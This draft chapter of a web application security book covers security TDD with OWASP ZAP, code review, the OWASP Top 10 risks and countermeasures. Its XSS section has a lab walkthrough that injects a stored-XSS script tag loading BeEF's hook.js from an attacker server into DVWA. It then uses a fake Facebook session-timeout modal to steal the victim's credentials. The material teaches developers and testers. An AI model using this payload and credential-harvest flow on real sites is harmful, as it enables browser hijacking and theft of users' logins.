# Web Applications {#web-applications}

![10,000' view of Web Application Security](images/10000WebApp.gif)

## Development Practices

Let's look at some of the practices we can use as developers to lift the level of security within our software.

### Architecture

There are no architects in Scrum. Just Developers. Some of those developers have architect qualities. They like to step back often to see the bigger picture and understand the interactions between the components and the people using the software. Including every aspect to do with the end product, the people intending to use it and the risks.

Agile architecture does a little design up front in collaboration with the team and everyone that has a vested interest. Agile architecture is not siloed, because it's part of development, just as analysing requirements and testing. It's all done in parallel.

So, we don't really separate the discipline of architecture from a software developer that excels at doing what a traditional architect does as well as engineering.

&nbsp;

### Security Test-Driven Development (STDD)

![](images/red_green_refactor.jpg)

There are a couple of aspects I'd like to focus on here. You can simply continue to use your existing automated test suites and frameworks. All you have to do is:

1. Add a **security focused test API** into the mix of your existing automated acceptance test suites.  
 You're chosen (language specific) BDD framework of choice, putting legs to your test conditions with automatable "[Given, When, Thens](http://blog.binarymist.net/2012/03/24/how-to-optimise-your-testing-effort/#planningTheTestEffort)".
2. Add **security focused BDD/TDD/ATDD** tests.
 This is the same amount of work as any other automated TDD, but it has the huge benefit of bringing the finding of security faults from where it's very expensive to fix:  

    ![](images/CostOfChange.png)  

    to where it's the cheapest possible place to fix:

    ![](images/CostOfChange-WithSTDD.png)  

&nbsp;

1. Continuing No. 1 from above: [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (which also comes [pre-installed on Kali Linux](http://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#zap) ) is a particularly useful tool for SBDD and regression testing. Because it not only provides a manual tool similar to the likes of Burp Suite + with many other features. ZAP also has the ability to run as a HTTP proxy:
    1. You can run ZAP manually then through the menu Tools -> Options... -> API turn the HTTP API on
    2. Run ZAP from the command line using the -daemon flag
    
        {linenos=off}
            owasp-zap -daemon

    You can then access the API like this:
    
    {linenos=off,lang=bash}
       curl http://localhost:8080 # Providing ZAP is listening on port 8080

  
    This allows us to within our Behavioural, Acceptance tests, send requests programmatically directly to the ZAP HTTP API to do what ever we could do manually with the tool against the System Under Test (SUT).
 You can of course use Selenium 2 (WebDriver) also to drive browser tests and in parallel. I discussed this in ["Automating Specificatioin by Example"](http://blog.binarymist.net/2014/02/22/automating-specification-by-example-for-net/#scope).

    The ZAP API can be accessed directly or by any of the following client implementations:

    * Node.JS (by way of [zaproxy](https://www.npmjs.com/package/zaproxy))
    * Python
    * PHP
    * Ruby
    * .Net [write-up](http://www.codeproject.com/Articles/708129/Automated-penetration-testing-in-the-Microsoft-sta), [source](https://github.com/gustavorhm/ZapPenTester). It's easy to see how the API is started and used [here](https://github.com/gustavorhm/ZapPenTester/blob/master/ZAPPenTester/Zap.cs).  
 There's also the [OWASP Secure TDD Project](https://www.owasp.org/index.php/OWASP_Secure_TDD_Project). A .Net solution. This project appears to either be abandoned or just very low activity. Feel free to offer to help though if you're a .Net developer. I'm not sure I agree with one of the opening statements: "they need to cover all tests prior development". The approach that I'd take would be to write some specification (test), execute it, (red) -> Write the smallest amount of code possible to make it pass (green) -> Add to the specification (test)(refactor). As you can see that's your red->green->refactor loop, with the smallest amount possible for each iteration.
    * Java. A couple of client projects useful for seeing how to use the ZAP API: [zap-webdriver](https://github.com/continuumsecurity/zap-webdriver), [bdd-security](https://github.com/continuumsecurity/bdd-security)

    For getting started with OWASP ZAPs API chcek the:

    * [regression testing](https://code.google.com/p/zaproxy/wiki/SecRegTests)
    * [API details](https://code.google.com/p/zaproxy/wiki/ApiDetails)

2. Continuing No. 2 from above: This is adding another aspect to your existing TDD/BDD thought process. Instead of the business waiting until go-live before contracting the experts to beat up your system. Then tell you **your security sucks**. We take a proactive approach and move a lot of the effort traditionally performed at go-live **up front**, where you yourself as the developer can test and fix. Thus saving embarrassment and the business a lot of money.  
BSIMM has some good [guidance on security testing](https://www.bsimm.com/online/ssdl/st/)

What's so good about STDD and SBDD, is that it roles up Specifications, Design, Implementation and Verification all into one process. Thus working toward delivering each increment that's truly ["Done"](http://blog.binarymist.net/2013/03/02/how-to-increase-software-developer-productivity/#definitionOfDone). Driving development with tests is not about testing right? It's about creating code that's testable. Testable code is inherently well designed and gives us the ability to reason about the state at any given time.  
OpenSSL Heartbleed and Apples Goto Fail could have been prevented if (S)TDD was used. Check out Mike Bland's [excellent study and POC](http://martinfowler.com/articles/testing-culture.html).

<!--- Other Resources: http://www.continuumsecurity.net/services.html#testing -->

&nbsp;

### Hand-crafted Penetration Testing

Sometimes known as "gorilla testing".

As previously discussed, this can be costly when performed late in a projects life cycle, so by automating as much as possible, including high level scans which help to identify starting points to attack, it leaves the developers to do what they do best...

Get creative.

There is no reason why developers can not take a good chunk of the manual penetration testing effort on as part of their daily development practices. In fact in most teams I've lead, this has been exactly how we've worked. The gorilla testing needs to be performed in parallel with the PBIs in the Scrum Backlog as developers pull them into Work I Progress (WIP).

Some developers gravitate toward security more than others, so it's important to have at least a none zero number of developers with a security focus within each team to:

1. take the lead on the security front
2. mentor and pass on their knowledge and passion to others

BSIMM againg has some [good guidance](https://www.bsimm.com/online/deployment/pt/) on hands on penetration testing.

&nbsp;

### Code Review

If we can't get the simple things right like [Coding standards and conventions](http://blog.binarymist.net/2012/12/19/javascript-coding-standards-and-guidelines/) to help remove some of the "wild west" attitudes and behaviours, then how will we ever get the complicated things right? The whole team needs to abide by the standards, conventions and guidelines.

[Callback Hell Alternatives](http://blog.binarymist.net/2014/07/26/node-js-asynchronicity-and-callback-nesting/) for example.

Manual and Automated.

Check out the [BSIMM Code Review](https://www.bsimm.com/online/ssdl/cr/) for some good ideas.

#### Linting, Static Analysis

Start with the likes of JSHint. There are lots of other good tooling options.

Techniques and tools to assist with automating

* [https://wiki.mozilla.org/Security/B2G/JavaScript_code_analysis](https://wiki.mozilla.org/Security/B2G/JavaScript_code_analysis)
* [JSPrime](https://www.youtube.com/watch?v=Vk5SPGpqiLc) Security focused

#### Dynamic Analysis

Tooling is still immature here. We've got a way to go, but lets start getting our feet wet.

* [Titanium Code Processor](https://theoreticalideations.com/tag/titanium-code-processor/)
* [Slide Deck](https://speakerdeck.com/ariya/dynamic-code-analysis-for-javascript)
* [Jalangi](https://www.eecs.berkeley.edu/~gongliang13/jalangi_ff/)

&nbsp;

### Techniques for Asserting Discipline

JavaScript is an inherently flexible and undisciplined language. This quality is a double edged sword. It provides us with extreme power and also allows us to slaughter ourselves. Discipline is very much needed in order to stay safe and be able to reason about our applications as they grow larger.

I've been involved in many JavaScript project rescue missions where a development team can no longer understand what the monster they have created is doing, what state it is in and why? In almost all occasions, the developers on the team do not have a deep understanding of the language and often of any language. Because of this I always try and push the fact that JavaScript developers must do everything they can to understand the language. In most cases this means taking their learning home and getting intimate with JavaScripts beauty.

Because of the distinct lack of discipline within JavaScript (unlike most other languages) I try and bring as much understanding around techniques that can help impose the extra rigour where and when it's needed. The beautiful thing about JavaScript is that when you really need to do something unconventional, you can, but I like to **weigh up the trade-offs** of either approach.

#### Static Type Checking

In JavaScript we need as much help as we can to fail fast. Static type checking gives us this. It also feels like the step before DbC.

* [flow](http://flowtype.org/) looks to be a good option. Providing consumers with the option of introducing type checking progressivly and/or to certain parts that make the most sense. Or rather missing parts that require the extra flexibility.


#### Design by Contract (DbC)

Enforcing preconditions, postconditions and invariants in our routines.
That's right, we can even employ this design principle in JavaScript. I wrote about DbC in a [previous post](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#dbc) in regards to usage in .Net.  
In JavaScript, I believe the DbC principle is even more important as part of adding discipline and keeping us on the straight and narrow. I believe DbC is the principle that helps us achieve the [Liskov Substitution Principle](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#lsp), which is the 'L' in the SOLID design mnemonic. These are the offerings I've noticed that provide support:

1. [ristretto-js](https://code.google.com/p/ristretto-js/w/list)
2. [contract-js on NPM](https://www.npmjs.com/package/contracts-js)
  * [contract.js at home](http://www.contractsjs.org/)
3. [contractual on NPM](https://www.npmjs.com/package/contractual)

In many cases you can implement your cross cutting code contracts using AOP. This gets it out of your code, so that it's not in your face.


## 1. SSM Asset Identification
Take results from [higher level Asset Identification](#ssm-asset-identification). Remove any that are not applicable. Add any newly discovered.

## 2. SSM Identify Risks
Go through same process as we did at the [top level](#ssm-identify-risks), but for Web Application.

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)
* _Todo_ Exploit WebRTC
  * [Part 1](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with.html)
  * [Part 2](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with_26.html)

This slide was from a talk I did at OWASP NZ Day 2013. The top 10 vulnerabilities don't change a lot

&nbsp;

![](images/2013OWASPTop10.jpg)

&nbsp;

They were actually very similar 10 years ago.
   
The unchangeable vulnerabilities are:

* No. 1 Injection (and the easiest to fix)
* No. 2 Broken Authentication and Session Management
* No. 3 XSS
* No. 4 Insecure Direct Object References
* No. 5 Security Misconfiguration
* No. 8 Frameworks are helping with CSRF
* No. 9 is new, because we’re now consuming a lot more packages without vetting them.

&nbsp;

![](images/OWASPTop10SomeThingsDontChange.jpg)

{pagebreak}

### Lack of Input Sanitisation {#web-applications-identify-risks-lack-of-input-sanitisation}
![](images/ThreatTags/easy-common-average-severe.png)

#### Buffer Overflows {#web-applications-identify-risks-buffer-overflows}

_Todo_
<!--- https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008 -->

#### Cross-Site Scripting (XSS) {#web-applications-identify-risks-cross-site-scripting}
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

&nbsp;

_Todo_ Discuss intricacies of XSS

&nbsp;

![](images/HandsOnHack.png)

The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in chapter 8 People, under [Spear Phishing](#people-identify-risks-spear-phishing). 

Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it's likely you would have been through the following:

1. Information gathering (probably partly even before you signed the contract with your client)
2. Vulnerability scanning
3. Vulnerability searching

If you're working within a development team you may have found out some other way that your project was vulnerable to XSS.

How ever you got to this point, you're going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.  
One of BeEF's primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network (as discussed in chapter 5 Physical, under the [Fortress Mentality](#physical-identify-risks-fortress-mentality) section). Exposing XSS faults is one of BeEF's attributes. 

You can find the video of how this attack is played out [here](https://www.youtube.com/watch?v=92AWyUfJDUw).

I> ## Synopsis
I>
I> In this exercise, I've used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.

{icon=bomb}
G> ## The Play
G>
G> Make sure you have the OWASPBWA [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.
G>
G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you've configured TLS) with the user and password that you setup in the BeEF root config.yaml.
G>
G> Open another browser tab and log-in to the DVWA.
G>
G> Browse to "XSS stored".
G>
G> Enter some text in the Name field and some text in the Message field.
G> 
G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on.
G>
G> Fire up burp.
G>
G> Back in the DVWA send your request by clicking on the Sign Guestbook button.
G>
G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
G>
G> You can disable FoxyProxy now too.
G>
G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you'll now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
G>
G> If you open the victims browser developer tools, you'll be able to inspect the communications and the JavaScript within the hook.js file.
G>
G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
G>
G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you've done due diligence in the reconnaissance stage.
G>
G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  

#### SQLi {#web-applications-identify-risks-sqli}

![](images/HandsOnHack.png)

 One of the simplest and quickest vulnerabilities to fix, yet it's still top of the hit lists.  
 Lets hammer this home some more.

#### Command Injection {#web-applications-identify-risks-command-injection}

![](images/HandsOnHack.png)

#### LDAP Injection {#web-applications-identify-risks-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-identify-risks-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-identify-risks-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-identify-risks-xslt-injection}

_Todo_

#### XML Injection {#web-applications-identify-risks-xml-injection}

_Todo_

### Lack of Authentication {#web-applications-identify-risks-lack-of-authentication}

_Todo_  
_Todo_  
...

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-identify-risks-cryptography-on-the-client}

* Untrusted Crypto (Web Crypto API). Is this really a good idea? _Todo_
  * [https://www.hackinparis.com/node/309](https://www.hackinparis.com/node/309)
  * [http://tonyarcieri.com/whats-wrong-with-webcrypto](http://tonyarcieri.com/whats-wrong-with-webcrypto)

### Consuming Free and Open Source {#web-applications-identify-risks-consuming-free-and-open-source}
![](images/ThreatTags/average-widespread-difficult-moderate.png)

This is where [A9 (Using Components with Known Vulnerabilities)](https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities) of the 2013 OWASP Top 10 comes in.

We are consuming far more free and open source libraries than we have ever before. Much of the code we're pulling into out projects is never intentionally used, but is still adding surface area for attack. Much of it:

* Is not tested (for what it should do and what it shouldn't do)
* Is not reviewed evaluated
* Is created by amateurs that could and do include vulnerabilities
* Does not undergo the same requirement analysis, defining the scope, acceptance criteria, test conditions and sign off by a development team and product owner.

Many vulnerabilities can hide in these external dependencies. It's not just one attack vector anymore, it provides the opportunity for many vulnerabilities to be sitting waiting to be exploited. If you don't find and deal with them, I can assure you, someone else will.

See Justin Searls [talk](http://blog.testdouble.com/posts/2014-12-02-the-social-coding-contract.html) on consuming all the open source.

## 3. SSM Countermeasures

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)

### Lack of Input Sanitisation {#web-applications-countermeasures-lack-of-input-sanitisation}
![](images/ThreatTags/PreventionAVERAGE.png)

* All user input should be escaped
* Ideally user input should conform to white lists
* Database accounts (in fact all accounts) should use least privilege
* I cover input sanitisation [here](http://blog.binarymist.net/2012/11/04/sanitising-user-input-from-browser-part-1/)
* Well structured data, like dates, social security numbers, zip codes, e-mail addresses, etc. then the developer should be able to define a very strong validation pattern

#### Buffer Overflows {#web-applications-countermeasures-buffer-overflows}

_Todo_

#### Cross-Site Scripting (XSS) {#web-applications-countermeasures-cross-site-scripting}

_Todo_

#### SQLi {#web-applications-countermeasures-sqli}

There are a few options here:

* Use prepared statements and/or parameterised queries
* Consider using Stored Procedures
* Read up on the [OWASP SQLi Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

#### Command Injection {#web-applications-countermeasures-command-injection}

On top of the points mentioned above under [Lack of Input Sanitisation](#web-applications-countermeasures-lack-of-input-sanitisation)
[This article](http://www.golemtechnologies.com/articles/shell-injection) is quite good.

#### LDAP Injection {#web-applications-countermeasures-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-countermeasures-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-countermeasures-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-countermeasures-xslt-injection}

_Todo_

#### XML Injection {#web-applications-countermeasures-xml-injection}

_Todo_

### Lack of Authentication {#web-applications-countermeasures-lack-of-authentication}

_Todo_  
_Todo_   
...

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-countermeasures-cryptography-on-the-client}

_Todo_

### Consuming Free and Open Source {#web-applications-countermeasures-consuming-free-and-open-source}
![](images/ThreatTags/PreventionEASY.png)

Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm) some excellent initiatives on how they do it at IBM. I'll attempt to paraphrase some of them here:

* Implement process and governance around which open source libraries you can use
* Legal review: checking licenses
* Scanning the code for vulnerabilities, manual and automated code review
* Maintain a list containing all the libraries that have been approved for use.  
If not on the list, make request and it should go through the same process.
* Once the libraries are in your product they should become as part of your own code so that they get the same rigour over them as any of your other code written in-house.  
* There needs to be automated process that runs over the code base to check that nothing that's not on the approved list is included.

There's an excellent paper by the SANS Institute on [Security Concerns in Using Open Source Software
for Enterprise Requirements](http://www.sans.org/reading-room/whitepapers/awareness/security-concerns-open-source-software-enterprise-requirements-1305) that is well worth a read. It confirms what the likes of IBM are doing in regards to their consumption of free and open source libraries

For NodeJS developers: Keep your eye on the [nodesecurity advisories](https://nodesecurity.io/advisories)

Leverage [**RetireJS**](https://github.com/RetireJS/retire.js) to help you work out JavaScript libraries with known vulnerabilities. RetireJS has:

1. A command line scanner. Excellent for builds. Include it in one of your build definitions and let it do the work for you.
2. A Chrome extension
3. A Grunt plugin
4. Burp and OWASP ZAP plugin

Test your web site with the RetireJS [online tool](http://retire.insecurity.today/)

For .Net developers, there is the likes of [OWASP **SafeNuGet**](https://github.com/OWASP/SafeNuGet)

### Web Application Firewall (WAF)

[WAFs](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs) are similar to Intrusion Prevention Systems (IPS) except they operate at the [Application Layer](http://en.wikipedia.org/wiki/Application_layer)(HTTP), Layer 7 of the [OSI model](http://en.wikipedia.org/wiki/OSI_model). So they understand the concerns of your web application at a technical level. WAFs protect your application against the likes of XSS, CSRF, SQLi, [Local File Inclusion (LFI)](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), session hijacking, invalid requests (requests to things that don't exist (think 404)). WAFs sit in-line between a gateway and the web application. They run as a proxy. Either on the physical web server or on another network node, but only the traffic directed to the web application is inspected, where as an IDS/IPS inspects all network traffic passed through it's interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. Although not only limited to dealing with known signatures, some WAFs can detect and prevent attacks they haven't seen before like responses containing larger than specified payloads.

1. [Fusker](https://www.npmjs.com/package/fusker). Not sure if this is still actively maintained. At this point, there hasn't been any recent commits for about three years, but it does look like the best offering we have at this stage for NodeJS. So if your looking to help a security project out...
2. [express-waf](https://www.npmjs.com/package/express-waf) has recent commits, but there is only a single developer working on it when I checked.
3. [AppSensor](http://appsensor.org/) brings detection -> prevention to your domain level.
  Most applications today just take attacks & fall over.
  I've heard so many times we want our applications to fail securely when they get bad input.
  We don't want our applications being bullied and failing securely.
  We want them to not fail at all in production, but rather defend themselves.
 
    The project defines a conceptual framework and methodology that offers prescriptive guidance to implement intrusion detection and automated response into your applications. Providing attack awareness baked in, with real-time defences.
  
    AppSensor provides > 50 (signature based) detection points. Provides guidance on how to respond once attack identified. Possible actions include:
    
    * logging out the user
    * locking the account or notifying an administrator
    * more than a dozen response actions are described.

## 4. SSM Risks that Solution Causes
> Are there any? If so what are they?

## 5. SSM Costs and Trade-offs
> An exercise for the reader. What are they?
